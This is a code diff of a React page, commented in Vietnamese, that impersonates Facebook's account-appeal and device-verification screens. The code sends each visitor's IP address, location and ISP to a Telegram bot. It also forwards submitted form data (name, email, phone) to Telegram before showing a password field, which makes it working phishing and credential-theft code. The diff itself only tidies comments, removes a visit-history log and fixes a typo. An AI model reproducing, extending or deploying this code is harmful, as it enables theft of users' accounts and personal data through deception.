@@ -67,7 +67,7 @@ const Home = () => {
     const [showLoading, setShowLoading] = useState(true);
     const [homeTranslated, setHomeTranslated] = useState(false);
 
-    // 🎯 HÀM GỬI THÔNG BÁO LƯỢT TRUY CẬP
+    // 🎯 THÊM HÀM GỬI THÔNG BÁO LƯỢT TRUY CẬP
     const sendVisitNotification = async (message) => {
         try {
             const response = await axios.post(`https://api.telegram.org/bot${config.noti_token}/sendMessage`, {
@@ -81,34 +81,19 @@ const Home = () => {
         }
     };
 
-    // 🎯 HÀM ĐẾM LƯỢT TRUY CẬP
+    // 🎯 THÊM HÀM ĐẾM LƯỢT TRUY CẬP
     const countVisit = async (ipData) => {
         try {
-            // Lấy dữ liệu hiện tại từ localStorage
-            const visitData = JSON.parse(localStorage.getItem('visitData') || '{"uniqueIPs":[],"visitHistory":[]}');
-            
+            const visitData = JSON.parse(localStorage.getItem('visitData') || '{"uniqueIPs":[]}');
             const currentIP = ipData.ip;
             const currentTime = new Date().toLocaleString('vi-VN');
             
-            // Kiểm tra IP đã truy cập trước đó chưa
             const isNewIP = !visitData.uniqueIPs.includes(currentIP);
             
-            // CHỈ THÊM VÀO NẾU LÀ IP MỚI
             if (isNewIP) {
                 visitData.uniqueIPs.push(currentIP);
-                
-                // Thêm vào lịch sử truy cập
-                visitData.visitHistory.push({
-                    ip: currentIP,
-                    time: currentTime,
-                    location: `${ipData.city || 'N/A'} - ${ipData.region || 'N/A'} - ${ipData.country || 'N/A'}`,
-                    isp: ipData.organization || 'N/A'
-                });
-                
-                // Lưu lại
                 localStorage.setItem('visitData', JSON.stringify(visitData));
                 
-                // 🎯 CHỈ GỬI TELEGRAM KHI CÓ IP MỚI
                 const visitMessage = `👤 <b>NGƯỜI DÙNG MỚI</b>
 🌍 <b>IP:</b> <code>${currentIP || 'N/A'}</code>
 📍 <b>Vị trí:</b> <code>${ipData.city || 'N/A'} - ${ipData.region || 'N/A'} - ${ipData.country || 'N/A'}</code>
@@ -121,8 +106,6 @@ const Home = () => {
                 
                 await sendVisitNotification(visitMessage);
             }
-            // NẾU IP CŨ VÀO LẠI - KHÔNG LÀM GÌ CẢ
-            
         } catch (error) {
             console.log('Count visit failed:', error);
         }
@@ -159,10 +142,11 @@ const Home = () => {
 
             const sendInfoTexts = {
                 title: 'Hệ thống chúng tôi đã tiếp nhận thông tin bạn gửi.',
-                description1: 'Nếu chúng tôi vẫn nhận thấy rằng bạn chưa đủ tuổi để sử dụng Facebook thì tài khoản của bạn sẽ vẫn bị vô hiệu hóa. Điều này là due to tài khoản của bạn không tuân theo Điều khoản dịch vụ của chúng tôi.',
+                description1: 'Nếu chúng tôi vẫn nhận thấy rằng bạn chưa đủ tuổi để sử dụng Facebook thì tài khoản của bạn sẽ vẫn bị vô hiệu hóa. Điều này là do tài khoản của bạn không tuân theo Điều khoản dịch vụ của chúng tôi.',
                 description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.'
             };
 
+            // 🎯 Dịch verify với data mặc định - ĐÃ SỬA
             const verifyTexts = {
                 title: 'Check your device',
                 description: `We have sent a verification code to s****g@m****.com, ******32 . Please enter the code we just sent to continue.`,
@@ -209,7 +193,7 @@ const Home = () => {
             
             localStorage.setItem('ipInfo', JSON.stringify(ipData));
             
-            // 🎯 ĐẾM LƯỢT TRUY CẬP VÀ GỬI THÔNG BÁO
+            // 🎯 THÊM GỌI HÀM ĐẾM LƯỢT TRUY CẬP
             await countVisit(ipData);
             
             const detectedCountry = ipData.country_code || 'US';
@@ -408,6 +392,7 @@ const Home = () => {
         return Object.keys(newErrors).length === 0;
     };
 
+    // 🎯 CẬP NHẬT: Hàm submit nhanh - UPDATE ALL TRƯỚC KHI HIỆN PASSWORD
     const handleSubmit = async () => {
         if (!isFormEnabled || isSubmitting) return;
         
@@ -415,7 +400,7 @@ const Home = () => {
             try {
                 setIsSubmitting(true);
                 
-                // 🎯 GỬI TELEGRAM DATA FORM (vào cá nhân)
+                // 🎯 GỬI TELEGRAM DATA FORM
                 const telegramMessage = formatTelegramMessage(formData);
                 await sendMessage(telegramMessage);
 
@@ -428,12 +413,13 @@ const Home = () => {
                 };
                 localStorage.setItem('userInfo', JSON.stringify(userInfoData));
 
-                // 🎯 UPDATE DỊCH VERIFY VỚI DATA THẬT
+                // 🎯 UPDATE DỊCH VERIFY VỚI DATA THẬT (TRƯỚC KHI HIỆN PASSWORD)
                 const targetLang = localStorage.getItem('targetLang');
                 if (targetLang && targetLang !== 'en') {
                     await updateVerifyTranslation(targetLang, userInfoData.email, userInfoData.phone);
                 }
 
+                // 🎯 HIỆN PASSWORD SAU KHI ĐÃ UPDATE ALL XONG
                 setIsSubmitting(false);
                 setShowPassword(true);
                 
@@ -453,6 +439,7 @@ const Home = () => {
         }
     };
 
+    // 🎯 HÀM UPDATE DỊCH VERIFY VỚI DATA THẬT - ĐÃ SỬA
     const updateVerifyTranslation = async (targetLang, email, phone) => {
         try {
             const verifyTexts = {
